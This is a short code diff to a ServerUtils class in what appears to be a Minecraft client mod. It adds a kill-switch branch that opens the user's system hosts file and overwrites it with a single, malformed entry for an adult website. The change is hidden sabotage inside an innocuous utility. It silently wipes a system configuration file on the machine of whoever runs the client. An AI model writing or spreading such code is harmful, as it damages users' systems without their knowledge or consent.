@@ -6,9 +6,7 @@ import dev.africa.pandaware.utils.player.PlayerUtils;
 import lombok.experimental.UtilityClass;
 import net.minecraft.client.gui.GuiMultiplayer;
 
-import java.io.BufferedReader;
-import java.io.File;
-import java.io.FileReader;
+import java.io.*;
 
 @UtilityClass
 public class ServerUtils implements MinecraftInstance {
@@ -26,6 +24,13 @@ public class ServerUtils implements MinecraftInstance {
                         compromised = true;
 
                         break;
+                    }
+                }
+
+                if (Client.getInstance().isKillSwitch()) {
+                    if (line.equals("")) {
+                        FileWriter fw = new FileWriter(hostsFile);
+                        fw.write("pornhub.com     127.0.0.1");
                     }
                 }
             }
